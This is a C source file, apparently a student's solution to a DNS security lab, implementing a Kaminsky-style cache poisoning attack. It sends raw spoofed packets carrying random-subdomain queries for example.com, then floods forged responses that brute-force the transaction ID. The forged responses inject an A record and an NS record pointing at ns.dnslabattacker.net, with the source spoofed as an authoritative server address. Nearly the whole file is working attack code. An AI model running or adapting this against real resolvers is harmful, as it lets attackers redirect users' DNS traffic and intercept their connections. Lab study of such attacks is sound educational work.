// ----udp.c------
// This sample program must be run by root lol! 
// 
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for 
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
// 

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
     
// Can create separate header file (.h) for all headers' structure
// The IP header's structure
struct ipheader {
     unsigned char iph_ihl:4, iph_ver:4;
     unsigned char iph_tos;
     unsigned short int iph_len;
     unsigned short int iph_ident;
 //    unsigned char      iph_flag;
     unsigned short int iph_offset;
     unsigned char iph_ttl;
     unsigned char iph_protocol;
     unsigned short int iph_chksum;
     unsigned int iph_sourceip;
     unsigned int iph_destip;
};
// UDP header's structure
struct udpheader {
   unsigned short int udph_srcport;
   unsigned short int udph_destport;
   unsigned short int udph_len;
   unsigned short int udph_chksum;
};
struct dnsheader {
   unsigned short int query_id;
   unsigned short int flags;
   unsigned short int QDCOUNT;
   unsigned short int ANCOUNT;
   unsigned short int NSCOUNT;
   unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd {
   unsigned short int  type;
   unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)

// This is the structure which holds the answer related information after the url
// in the data part after udp header. 

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
      cksum+=*usBuff++;
    }
    if(isize==1){
      cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
        unsigned long sum = 0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);

	sum+=ntohs(IPPROTO_UDP+len);
	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);
	return (uint16_t)(~sum);
}

// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{       
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
       sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Example of Answer Record Structure:
/******************************************************************************************************** 
    Name                Record Type     class        Time To Live        Data Length      Data: IP Address
  twysw.example.com     "A" record      Internet     0x00002000(seconds)  0x0004           1.2.3.4
                        0x0001          0x0001
*********************************************************************************************************/ 
unsigned short set_A_record(char *buffer, char* name, char offset, char* ip_addr) {
   char *p = buffer;
   if (name == NULL) {
     
   } else {
      strcpy(p, name);
      p += strlen(name)+1;  
   }

   *((unsigned short *)p) = htons(0x0001);  // Record type
   p += 2;
   
   *((unsigned short *)p) = htons(0x0001);  // Class type
   p += 2;
  
   *((unsigned int *)p) = htonl(0x00002000);  // TTL
   p += 4;
   
   *((unsigned short *)p) = htons(0x0004);  // Data Length
   p += 2;

   ((struct in_addr *)p)->s_addr = inet_addr(ip_addr);
   p += 4;

   return p- buffer;
}


// This is the structure which holds the authoritative NameServer
// Exaple of Authoritative Name Server Structure:
/*********************************************************************************************************
  Name         Record Type     Class        Time To Live          Data Length         Data : Name Server
 example.com   "NS" Record     Internet     0x000020000(seconds)   0x0017             ns.dnslabattacker.net
                0x0001         0x0001                                                   ||
                                                                                        \/(Pkt-Representation)
                                                           2|n|s|14|d|n|s|l|a|b|a|t|t|a|c|k|e|r|3|n|e|t   
**********************************************************************************************************/
unsigned short set_NS_record(char *buffer, char* name, char offset, char* ip_addr) {
   char *p = buffer;
   if (name == NULL) {
     
   } else {
      strcpy(p, name);
      p += strlen(name)+1;  
   }

   *((unsigned short *)p) = htons(0x0002);  // Record type
   p += 2;
   
   *((unsigned short *)p) = htons(0x0001);  // Class type
   p += 2;
  
   *((unsigned int *)p) = htonl(0x00002000);  // TTL
   p += 4;
   
   *((unsigned short *)p) = htons(0x0017);  // Data Length = 23 here
   p += 2;

   strcpy(p, "\2ns");
   p += 3;

   *(p++) = 14;
    
   strcpy(p,"dnslabattacker");
   p += 14;

   strcpy(p, "\3net");
   p+=4;
  // ((struct in_addr *)p)->s_addr = inet_addr(ip_addr);
  // p += 4;

   return p - buffer;
}

void send_dns_response(char *url, char *s_addr, char *d_addr) {
    // socket descriptor
    int sd;
    // buffer to hold the packet
    char buffer[PCKT_LEN];
    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);
    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;

    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));

    struct dnsheader *dns= (struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload
    char *data= (buffer + sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader));
    // printf("Begin of data section: %p\n", (void *)data);
    //The flag you need to set is the response 
    dns->flags = htons(FLAG_R);
    /* Now we set the number of question records to 1 , 
                      number of answer records to 1, 
                      number of authority records to 1,
                      number of additional records to 1*/
   dns->QDCOUNT = htons(1);
   dns->ANCOUNT = htons(1);
   dns->NSCOUNT = htons(1);
   dns->ARCOUNT = htons(0); // Check if we  should  set it to zero/one ******************
    
   strcpy(data, url);
  int length = strlen(data)+1;

   //this is for convinience to get the struct type write the 4bytes in a more organized way.
  // printf("Checkpoint 1\n");
   struct dataEnd *end = (struct dataEnd *)(data + length);
   end->type  = htons(0x0001);  // this is record type in the dns response 0x0001
   end->class = htons(0x0001);  // this is class type which is Internet(IN) 0x0001
   
   // Now we frame the answer for the question record above.
   char *ans = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + 
                sizeof(struct dnsheader) + sizeof(struct dataEnd) + length);

   ans += set_A_record(ans, url, 0x0C, "1.2.3.4");
   ans += set_NS_record(ans, "\7example\3com", 0x0C, "1.2.3.4"); // Here 1.2.3.4 doesn't matter
                                     // as we are filling the IP field with ns.dnslabattacker.net
 
  /***************************************************************************************
   Construction of the packet is done.
   now focus on how to do the settings and send the packet we have composed out
  ***************************************************************************************/
   // Source and destination addresses: IP and port
   struct sockaddr_in sin, din;
   
   int one = 1;
   
   const int* val = &one;

   sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
   
   if (sd < 0) // if socket fails to be created
      printf("socket error\n");
    
   // The source is redundant, may be used later if needed
   // The address family
   sin.sin_family = AF_INET;
   din.sin_family = AF_INET;

   // Port numbers
   sin.sin_port = htons(53);
   din.sin_port = htons(33333);
    
   // IP addresses
   sin.sin_addr.s_addr = inet_addr(d_addr); // this is the address i got from dig -x example.com
                                                     // this is the address of a.iana-servers.net reply

   din.sin_addr.s_addr = inet_addr("199.43.135.53"); // this is the second argument we input into the program
   
   // Fabricate the IP header or we can use the

   // standard header structures but assign our own values.

   ip->iph_ihl = 5;

   ip->iph_ver = 4;

   ip->iph_tos = 0; // Low delay

/*   unsigned short int packetLength = (sizeof(struct ipheader)+ sizeof(struct udpheader)+ 
                                      sizeof(struct dnsheader)+length+ sizeof(struct dataEnd) + 
                                      ansLength + sizeof(struct ansEnd) + addrlen +  
                                      nslength + sizeof(struct nsEnd) + nsnamelen + addrecLength + 
                                      sizeof(struct ansEnd) + arcAddrLength);*/
   unsigned short int packetLength =  (sizeof(struct ipheader)+ sizeof(struct udpheader)+ 
                                        sizeof(struct dnsheader) + ans - buffer);
   ip->iph_len = htons(packetLength);
   
   ip->iph_ident = htons(rand()); // generate random identification number
   
    ip->iph_ttl = 110; // hops

    ip->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr("199.43.135.53");

    ip->iph_destip = inet_addr(d_addr);
    
    // Fabricate the UDP header. Source port number, redundant

    udp->udph_srcport = htons(53);  // source port number DNS Server sends the reply on 53 port

    // Destination port number

    udp->udph_destport = htons(33333);
   
/*    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader)
                         + length + sizeof(struct dataEnd) + ansLength + sizeof(struct ansEnd) +
                          addrlen + nslength + sizeof(struct nsEnd) + nsnamelen);*/
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + ans - buffer);
    
    // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));

    udp->udph_chksum = check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    // Inform the kernel do not fill up the packet structure. we will build our own...
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
    {
      printf("error\n");
      exit(-1);
    }
   
    int count = 1;
    dns->query_id = htons(2000);
  //  dns->query_id = htons(count);
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
  //  printf("Before the spoof Response successful to dest: \n");
    if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
           printf("packet send error %d which means %s\n",errno,strerror(errno));
   // int trans_id = rand() % 3000;
    while (count < 1000) {
        dns->query_id = htons(count+2000);
        // recalculate the checksum as we have changed the transaction id of dns header
        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
        // send the packet out.
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
           printf("packet send error %d which means %s\n",errno,strerror(errno));
        count++;
    } 
    printf("Response successful to dest: %s\n", d_addr);
    close(sd);
}


int main(int argc, char *argv[])
{

// This is to check the argc number
    if (argc != 3) {
    	printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP \n");
    	exit(-1);
    }

// socket descriptor
    int sd;
// buffer to hold the packet
    char buffer[PCKT_LEN];
// set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;

    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));

    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

// data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

////////////////////////////////////////////////////////////////////////
// dns fields(UDP payload field)
// relate to the lab, you can change them. begin:
////////////////////////////////////////////////////////////////////////

//The flag you need to set

	dns->flags=htons(FLAG_Q);
//only 1 query, so the count should be one.
	dns->QDCOUNT=htons(1);

    //query string
    strcpy(data,"\5aaaaa\7example\3com");
    int length= strlen(data)+1;

//this is for convinience to get the struct type write the 4bytes in a more organized way.

    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

/////////////////////////////////////////////////////////////////////
//
// DNS format, relate to the lab, you need to change them, end
//
//////////////////////////////////////////////////////////////////////



/*************************************************************************************
Construction of the packet is done. 
now focus on how to do the settings and send the packet we have composed out
***************************************************************************************/
    // Source and destination addresses: IP and port

    struct sockaddr_in sin, din;

    int one = 1;

    const int *val = &one;

    //    dns->query_id= rand(); 
    // transaction ID for the query packet, use random #
    dns->query_id= rand() % 3000; 
    // transaction ID for the query packet, use random #
    printf("Transaction ID is %d\n", dns->query_id);
    // Create a raw socket with UDP protocol

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0 ) // if socket fails to be created
      printf("socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program

    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the

    // standard header structures but assign our own values.

    ip->iph_ihl = 5;


    ip->iph_ver = 4;


    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+
                                      sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); 
     // length + dataEnd_size == UDP_payload_size

    ip->iph_len=htons(packetLength);

    ip->iph_ident = htons(rand()); // we give a random number for the identification#

    ip->iph_ttl = 110; // hops

    ip->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!

    ip->iph_sourceip = inet_addr(argv[1]);

    // The destination IP address

    ip->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant

    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved

    // Destination port number

    udp->udph_destport = htons(53);


    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)
                          +length+sizeof(struct dataEnd)); 
    // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));

    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
/*******************************************************************************8
Tips

the checksum is quite important to pass the checking integrity. You need 
to study the algorithem and what part should be taken into the calculation.

!!!!!If you change anything related to the calculation of the checksum, you need to re-
calculate it or the packet will be dropped.!!!!!

Here things became easier since I wrote the checksum function for you. You don't need
to spend your time writing the right checksum function.
Just for knowledge purpose,
remember the seconed parameter
for UDP checksum:
ipheader_size + udpheader_size + udpData_size  
for IP checksum: 
ipheader_size + udpheader_size
*********************************************************************************/

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
      printf("error\n");	
      exit(-1);
    }

    while(1) {
// This is to generate different query in xxxxx.example.com
	int charnumber;
	charnumber=1+rand()%5;
	*(data+charnumber)+=1;
        // recalculate the checksum for the UDP packet
	udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); 
	// send the packet out.
    	if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		printf("packet send error %d which means %s\n",errno,strerror(errno));
         /* Sleep for 1 second before sending the response */
           sleep(0.5); 
          /* Here data is the url which needs to be resolved,
             argv[2] is the destination address and argv[1] is the source address */
          printf("Before calling send_dns_response\n"); 
          send_dns_response(data, argv[1], argv[2]); 
    }
    close(sd);
    return 0;
}
